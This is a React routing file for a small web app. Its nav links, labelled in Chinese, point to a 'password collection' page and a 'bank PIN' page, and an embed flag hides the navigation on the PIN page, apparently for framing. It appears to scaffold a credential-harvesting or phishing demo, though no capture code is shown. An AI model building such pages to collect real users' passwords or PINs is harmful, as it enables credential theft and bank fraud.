import { Link, Navigate, Route, Routes, useLocation, useSearchParams } from "react-router-dom";
import Home from "./pages/Home";
import BankPinPage from "./pages/BankPinPage";
import PasswordPage from "./pages/PasswordPage";

export default function App() {
  const { pathname } = useLocation();
  const [searchParams] = useSearchParams();
  const embedBank =
    pathname === "/bank/pin" && searchParams.get("embed") === "1";

  return (
    <div className="layout">
      {!embedBank && (
        <nav className="row" style={{ marginBottom: "1.25rem" }}>
          <Link to="/dashboard">首页</Link>
          <Link to="/password">密码收集（同站）</Link>
          <Link to="/bank/pin">行内 PIN（档位 A）</Link>
        </nav>
      )}
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/dashboard" element={<Home />} />
        <Route path="/password" element={<PasswordPage />} />
        <Route path="/bank/pin" element={<BankPinPage />} />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </div>
  );
}
